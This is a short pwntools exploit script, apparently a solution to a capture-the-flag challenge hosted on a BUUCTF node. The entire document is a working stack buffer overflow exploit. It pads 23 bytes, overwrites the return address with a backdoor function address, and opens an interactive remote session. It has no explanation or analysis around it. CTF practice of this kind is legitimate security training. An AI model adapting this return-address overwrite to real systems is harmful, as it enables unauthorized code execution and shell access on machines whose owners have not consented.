from pwn import *

io=remote("node5.buuoj.cn",25352)

backdoor=0x401187

payload=b'a'*(15+8)+p64(backdoor)

io.send(payload)

io.interactive()